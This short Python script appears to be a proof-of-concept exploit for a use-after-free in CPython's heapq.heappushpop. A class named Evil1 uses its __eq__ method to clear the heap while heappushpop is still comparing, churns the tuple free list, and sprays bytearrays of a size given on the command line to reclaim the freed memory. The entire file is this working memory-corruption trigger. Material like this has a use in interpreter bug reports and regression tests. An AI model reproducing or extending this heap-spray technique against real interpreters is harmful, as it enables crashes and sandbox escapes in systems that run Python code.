import heapq
import sys

# The size is passed as an argument
payload_size = int(sys.argv[1])

class Evil1:
    def __eq__(self, other):
        # Fill tuple free list
        dummy = [(i, i) for i in range(10000)]
        del dummy
        
        # Free top
        heap.clear()
        
        # Spray bytearray of testing size
        # We fill it entirely with 0x41
        payload = b'\x41' * payload_size
        
        global spray
        spray = [bytearray(payload) for _ in range(10000)]
        
        return True

class Evil2:
    def __gt__(self, other):
        return True

heap = [(Evil1(), 0)]

try:
    heapq.heappushpop(heap, (0, Evil2()))
except Exception as e:
    pass
